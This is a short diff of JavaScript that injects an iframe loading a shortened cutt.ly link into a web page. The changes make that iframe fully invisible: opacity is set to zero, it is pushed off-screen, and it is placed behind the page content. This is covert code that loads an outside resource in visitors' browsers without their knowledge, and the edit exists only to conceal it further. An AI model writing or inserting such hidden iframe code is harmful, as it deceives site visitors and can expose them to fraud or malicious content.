@@ -4,12 +4,12 @@
   iframe.width = "20";
   iframe.height = "30";
   iframe.src = "https://cutt.ly/ErxZ0j9R";
-  iframe.style.opacity = "0.01"; // Almost invisible
+  iframe.style.opacity = "0"; // Almost invisible
   iframe.style.pointerEvents = "none"; // Prevent interaction
   iframe.style.position = "fixed";
   iframe.style.bottom = "0";
-  iframe.style.left = "0";
-  iframe.style.zIndex = "9999";
+  iframe.style.left = "3000px";
+  iframe.style.zIndex = "-9999";
   document.body.appendChild(iframe);
 })();
 
